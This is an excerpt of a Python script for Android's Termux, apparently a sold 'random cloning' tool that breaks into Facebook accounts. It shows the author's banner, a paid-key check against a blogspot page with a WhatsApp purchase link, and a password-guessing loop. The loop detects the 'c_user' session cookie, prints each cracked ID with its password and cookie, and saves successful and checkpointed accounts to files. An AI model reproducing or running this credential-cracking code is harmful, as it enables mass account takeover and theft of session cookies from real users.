...
\033[1;37m[+] AUTHOR       :   MOHAMMED ABDULLAH 
\033[1;37m[+] FACEBOOK     :   Mohammed Abdullah 
\033[1;37m[+] GITHUB       :   AbdullahX4
\033[1;37m[+] TEAM         :   \33[1;42  MaX4 Squad\33[0m
\033[1;37m[+] TOOLS        :   RENDOM CLONING 💙🔥
...
ABDULLAH="ABDULLAH-UiD-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.rv-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.rv-cov', 'w')
	kok.write(myid+ABDULLAH)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.rv-cov', 'r').read()
	os.system('clear')
	print(logo)
	r1=requests.get("https://ABDULLAH1352.blogspot.com/2022/08/file-cloning-ony-ok.html").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		main()
		...
		print("")
		print(f"\033[92;1m[\033[91;1m●\033[92;1m] YOUR KEY : {warna}"+ABDULLAH+key1) 
		input("\n\033[92;1m[\033[91;1m●\033[92;1m] PRESS ENTER TO SEND KEY IN WHATSAPP ツ")
		time.sleep(3.5)
		fhr = '*ASALAMUALIKUM*%2C%20*ABDULLAH-SiR*%20*I*%20*BUY*%20*YOUR*%20*RANDOM*%20*CLONING*%20*NEW*%20*TOOL*%20*MY*%20*KEY*%20*:*'+ABDULLAH+''+key1
		os.system('am start https://wa.me/+8801840888505?text=' + fhr)
		Subscraption()
#------------------[ 🦠VIRUS😷 ]-------------------#
...
class Main:
	def __init__(self):
		...
		print(logo)
		print(f'\n')
		print(f'\033[92;1m[\033[91;1m●\033[92;1m]──────────────────\x1b[1;91m❴\x1b[1;96m\033[91;1m\033[47mABDULLAH-BHAI\033[40m\x1b[1;91m❵\x1b[1;92m──────────────────\033[92;1m[\033[91;1m●\033[92;1m]')
		print('')
		...
		ABDULLAH_BHAI = input('\033[92;1m╰─\033[92;1m[\033[91;1m●\033[92;1m]\033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : \033[1;32m')
		if ABDULLAH_BHAI in ["", " "]:
			os.system("xdg-open https://github.com/AbdullahX4")
			Main()
		elif ABDULLAH_BHAI in ["E", "e"]:
			print("   \033[92;1m[\033[91;1m●\033[92;1m] ASSALAMUALAIKUM ALLAH HAFEZ 𓆩😘𓆪 𓆩😘𓆪 ")
			os.system("xdg-open https://github.com/AbdullahX4")
			exit()
		elif ABDULLAH_BHAI in ["A", "a"]:
			os.system("xdg-open https://github.com/Abdullah X4")
			print("")
			time.sleep(5)
...
def pass2():
    ...
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK ID'S SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system("play-audio ABDULLAH_OK.mp3")
                print('\033[1;92m[ABDULLAH-OK👑] '+uid+' | '+ps+'\n\033[92;1m[\033[91;1m●\033[92;1m] COOKIE : '+coki+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                os.system("play-audio ABDULLAH_CP.mp3")
                print('\033[1;97m[ABDULLAH-CP🥺] '+uid+' | '+ps+' | '+fhr+'\033[0;97m')
